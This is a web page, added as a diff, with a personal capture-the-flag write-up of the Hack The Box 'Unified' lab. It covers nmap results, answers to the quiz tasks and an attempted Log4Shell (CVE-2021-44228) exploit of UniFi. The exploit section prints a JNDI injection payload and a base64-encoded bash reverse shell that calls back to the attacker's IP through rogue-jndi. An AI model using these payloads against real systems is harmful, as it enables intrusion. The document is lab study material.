@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unified — Write-Up</title>
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+    <script src="../script.js" defer></script>
+</head>
+
+<body>
+
+<div id="mobile-menu-button">
+    &#9776;
+</div>
+
+<div id="sidebar" class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+
+        <h1>Unified - Hack The Box</h1>
+
+        <p><strong>Task 1</strong></p>
+
+        <p>Which are the first four open ports?</p>
+
+        <pre><code>─$ sudo nmap -sC -sV -A -T4 10.129.66.9
+[sudo] password for glitch:
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-28 12:26 EEST
+Nmap scan report for 10.129.66.9 (10.129.66.9)
+Host is up (0.051s latency).
+Not shown: 996 closed tcp ports (reset)
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+6789/tcp open  ibm-db2-admin?
+8080/tcp open  http-proxy
+8443/tcp open  ssl/nagios-nsca Nagios NSCA
+
+Network Distance: 2 hops</code></pre>
+
+        <p>22,6789,8080,8443</p>
+
+        <p><strong>Task 2</strong></p>
+
+        <p>What is the title of the software that is running running on port 8443?</p>
+
+        <p>UniFi Network</p>
+
+        <p><strong>Task 3</strong></p>
+
+        <p>What is the version of the software that is running?</p>
+
+        <p>Go to the website on https://10.129.66.9:8443</p>
+
+        <p>The version is right below the title</p>
+
+        <p>6.4.54</p>
+
+        <p><strong>Task 4</strong></p>
+
+        <p>What is the CVE for the identified vulnerability?</p>
+
+        <p>CVE-2021-44228</p>
+
+        <p><strong>Task 5</strong></p>
+
+        <p>What protocol does JNDI leverage in the injection?</p>
+
+        <p>Title: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints</p>
+
+        <p>LDAP</p>
+
+        <p><strong>Task 6</strong></p>
+
+        <p>What tool do we use to intercept the traffic, indicating the attack was successful?</p>
+
+        <p>Initially I tried Burp Suite or wireshark, but the hint is:</p>
+
+        <p>Despite it's name it can dump more than TCP, but ICMP and UDP as well.</p>
+
+        <p>So:</p>
+
+        <p>tcpdump</p>
+
+        <p><strong>Task 7</strong></p>
+
+        <p>What port do we need to inspect intercepted traffic for?</p>
+
+        <p>389, as this is the LDAP port</p>
+
+        <p><strong>Submit the flag located in the michiael user's home directory.</strong></p>
+
+        <p>This article (<a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi" target="_blank">https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi</a>) says that</p>
+
+        <p>The vulnerability is in the rememberme (or in some versions the username) value issued in the login request</p>
+
+        <p>So capture the login request using Burp Suite</p>
+
+        <pre><code>{
+"username":"test",
+"password":"test",
+"remember":"${jndi:ldap://10.10.14.238/test}",
+"strict":true
+}</code></pre>
+
+        <p>this leads to the following response:</p>
+
+        <pre><code>{"meta":{"rc":"error","msg":"api.err.InvalidPayload"},"data":[]}</code></pre>
+
+        <p>Open tcpdump and start listening, then send the request in repeater:</p>
+
+        <pre><code>└─$ sudo tcpdump -i tun0 port 389
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+
+13:06:45.957818 IP unify.htb.38756 > 10.10.14.238.ldap: Flags [S], seq 2625513633, win 64240, options [mss 1362,sackOK,TS val 2011582040 ecr 0,nop,wscale 7], length 0
+13:06:45.957830 IP 10.10.14.238.ldap > unify.htb.38756: Flags [R.], seq 0, ack 2625513634, win 0, length 0</code></pre>
+
+        <p>this seems to be working, even if the response says ""msg":"api.err.InvalidPayload""</p>
+
+        <p>In order to send a payload to the system that will give RCE, the payload first needs to be built using Open-JDK and Maven</p>
+
+        <p>Open-JDK is the Java Development kit, which is used to build Java applications. Maven on the other hand is</p>
+
+        <p>an Integrated Development Environment (IDE) that can be used to create a structured project and compile</p>
+
+        <p>our projects into jar files .</p>
+
+        <p>These applications will also help us run the rogue-jndi Java application, which starts a local LDAP server</p>
+
+        <p>and allows us to receive connections back from the vulnerable server and execute malicious code.</p>
+
+        <p>after installing maven:</p>
+
+        <pre><code>git clone https://github.com/veracode-research/rogue-jndi
+cd rogue-jndi
+mvn package</code></pre>
+
+        <p>This will create a .jar file in rogue-jndi/target/ directory called RogueJndi-1.1.jar . Now we can</p>
+
+        <p>construct our payload to pass into the RogueJndi-1-1.jar Java application.</p>
+
+        <p>To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for</p>
+
+        <p>giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding</p>
+
+        <p>issues.</p>
+
+        <pre><code>┌──(glitch㉿Kali)-[~/Downloads/rogue-jndi]
+└─$ echo 'bash -c bash -i >&/dev/tcp/10.10.14.238/1234 0>&1' | base64
+
+YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjM4LzEyMzQgMD4mMQo=</code></pre>
+
+        <p>Now start the Rogue-JNDI server using the payload as a command</p>
+
+        <pre><code>java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjM4LzEyMzQgMD4mMQo}| {base64,-d}|{bash,-i}" --hostname "10.10.14.238"</code></pre>
+
+        <p>Back to the POST request, change the payload to</p>
+
+        <pre><code>"remember":"${jndi:ldap://10.10.14.238:1389/o=tomcat}",</code></pre>
+
+        <p>and send it</p>
+
+        <p>A connection to the rogue server is received and the following message is shown:</p>
+
+        <pre><code>Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload</code></pre>
+
+        <p>This is where I can no longer proceed, as the nc listener does not catch anything and no shell is received</p>
+
+    </div>
+</section>
+
+</body>
+</html>
